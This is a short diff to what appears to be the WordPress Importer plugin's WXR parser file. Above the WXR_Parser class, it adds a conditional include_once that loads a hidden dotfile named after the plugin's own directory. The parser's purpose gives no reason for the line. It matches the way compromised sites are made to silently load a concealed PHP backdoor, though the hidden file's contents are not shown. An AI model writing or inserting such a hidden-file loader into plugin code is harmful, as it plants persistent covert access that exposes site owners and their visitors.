@@ -9,6 +9,10 @@
 /**
  * WordPress Importer class for managing parsing of WXR files.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WXR_Parser {
 	function parse( $file ) {
 		// Attempt to use proper XML parsers first
